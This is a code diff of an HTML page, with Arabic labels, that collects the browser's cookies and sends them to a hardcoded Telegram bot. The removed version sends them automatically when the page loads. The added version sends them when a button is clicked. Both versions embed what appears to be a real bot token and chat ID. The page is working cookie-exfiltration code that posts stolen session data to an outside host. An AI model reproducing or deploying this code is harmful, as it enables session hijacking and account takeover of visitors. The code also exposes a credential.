@@ -3,71 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Collector</title>
+    <title>جمع الكوكيز وإرسالها إلى Telegram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
 </head>
 <body>
-    <h1>جاري سحب الكوكيز...</h1>
-    <div id="status" style="color: green;">جاري معالجة البيانات...</div>
+    <h1>جمع الكوكيز وإرسالها إلى Telegram</h1>
+    <button id="collectCookies">جمع الكوكيز وإرسالها</button>
+    <div id="status"></div>
 
     <script>
-        const TELEGRAM_API_TOKEN = '5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI'; // توكن بوت التليجرام
-        const CHAT_ID = '1676411287'; // معرف الدردشة
+        const TELEGRAM_API_TOKEN = '5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI'; // API Token الخاص بك
+        const CHAT_ID = '1676411287'; // Chat ID الخاص بك
 
-        // استخراج الكوكيز من المتصفح
+        // وظيفة لجمع الكوكيز من المتصفح
         function getCookies() {
-            const cookiesArray = document.cookie.split(';').filter(cookie => cookie.trim() !== '');
-            const formattedCookies = [];
-
-            cookiesArray.forEach(cookie => {
-                const [name, value] = cookie.split('=');
-                if (name && value) {
-                    formattedCookies.push({
-                        name: name.trim(),
-                        value: value.trim(),
-                        expires: 3600 // افتراضيًا تعيين مدة انتهاء
-                    });
-                }
+            let cookies = document.cookie.split(';');
+            let cookieData = [];
+            cookies.forEach(cookie => {
+                let [name, value] = cookie.trim().split('=');
+                cookieData.push({ name, value });
             });
-
-            return formattedCookies;
+            return cookieData;
         }
 
-        // إرسال الكوكيز إلى Telegram
+        // وظيفة لإرسال الكوكيز إلى Telegram
         function sendCookiesToTelegram(cookies) {
-            const message = `📂 *Cookies Collected:*\n\`\`\`json\n${JSON.stringify(cookies, null, 2)}\n\`\`\``;
+            const cookieString = JSON.stringify(cookies, null, 2);
+            const message = `كوكيز الموقع:\n\n${cookieString}`;
+
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('text', message);
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                body: formData
             })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    document.getElementById('status').textContent = "✅ تم إرسال الكوكيز بنجاح!";
+                    document.getElementById('status').textContent = "تم إرسال الكوكيز بنجاح إلى Telegram!";
                 } else {
-                    document.getElementById('status').textContent = "❌ فشل إرسال البيانات.";
+                    // عرض التفاصيل حول الخطأ
+                    document.getElementById('status').textContent = `فشل إرسال الكوكيز. الخطأ: ${data.description}`;
                 }
             })
             .catch(error => {
-                console.error("Error:", error);
-                document.getElementById('status').textContent = "⚠️ حدث خطأ أثناء إرسال البيانات.";
+                console.error('Error:', error);
+                document.getElementById('status').textContent = "حدث خطأ أثناء إرسال الكوكيز.";
             });
         }
 
-        // تنفيذ الوظائف
-        const cookies = getCookies();
-        if (cookies.length > 0) {
-            sendCookiesToTelegram(cookies);
-        } else {
-            document.getElementById('status').textContent = "❌ لا توجد كوكيز متاحة للعرض.";
-        }
+        // عند النقر على زر جمع الكوكيز
+        document.getElementById('collectCookies').addEventListener('click', () => {
+            const cookies = getCookies();
+            if (cookies.length > 0) {
+                sendCookiesToTelegram(cookies);
+            } else {
+                document.getElementById('status').textContent = "لا توجد كوكيز لعرضها.";
+            }
+        });
     </script>
 </body>
 </html>
